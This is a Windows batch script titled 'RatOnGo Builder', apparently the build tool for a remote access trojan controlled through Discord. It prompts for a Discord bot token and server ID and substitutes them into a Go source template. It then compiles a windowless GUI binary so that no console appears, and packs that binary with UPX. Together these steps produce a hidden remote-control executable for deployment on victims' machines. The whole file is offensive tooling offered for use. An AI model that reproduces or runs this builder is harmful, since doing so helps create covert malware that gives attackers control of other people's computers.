@echo off
title RatOnGo Builder - by ng/wesk
setlocal

:: --- Config ---
set TEMPLATE_FILE=main.go
set TEMP_BUILD_FILE=main_build.go
set GO_BINARY_NAME=RatOnGo.exe
set UPX_PATH=.\upx\upx.exe

:: --- Clean old files ---
if exist %GO_BINARY_NAME% del %GO_BINARY_NAME%
if exist %TEMP_BUILD_FILE% del %TEMP_BUILD_FILE%

echo.
echo Welcome to the RatOnGo builder!
echo This script will help you create your bot executable.
echo.

:: --- Check template file ---
if not exist "%TEMPLATE_FILE%" (
    echo ERROR: '%TEMPLATE_FILE%' not found!
    echo Make sure your Go source is named exactly that.
    pause
    exit /b 1
)

:: --- Ask for info ---
set /p "TOKEN=Paste your Discord bot token: "
set /p "GUILD_ID=Enter your server (guild) ID: "

:: --- Prepare build file ---
echo Creating temporary file with your data...

powershell -Command "(Get-Content -Path '%TEMPLATE_FILE%') -replace 'YOUR_BOT_TOKEN_HERE', '%TOKEN%' | Set-Content -Path '%TEMP_BUILD_FILE%'"
powershell -Command "(Get-Content -Path '%TEMP_BUILD_FILE%') -replace 'YOUR_GUILD_ID_HERE', '%GUILD_ID%' | Set-Content -Path '%TEMP_BUILD_FILE%'"

echo Done.

:: --- Build with Go ---
echo Building the binary...
go build -ldflags="-s -w -H=windowsgui" -o %GO_BINARY_NAME% %TEMP_BUILD_FILE%
if %errorlevel% neq 0 (
    echo ERROR: Go build failed. Check your code.
    pause
    goto cleanup
)
echo Build successful.

:: --- Compress with UPX ---
echo Compressing with UPX...

if not exist "%UPX_PATH%" (
    echo ERROR: upx.exe not found in the 'upx' folder.
    pause
    goto cleanup
)
%UPX_PATH% --brute --overlay=strip --strip-relocs=0 %GO_BINARY_NAME% >nul
if %errorlevel% neq 0 (
    echo WARNING: UPX compression failed.
    pause
    goto cleanup
)
echo Compression finished.

:: --- Done ---
echo.
echo Done! Your file is ready: %GO_BINARY_NAME%
echo.

:cleanup
:: --- Clean temp file ---
if exist %TEMP_BUILD_FILE% del %TEMP_BUILD_FILE%
pause
exit /b
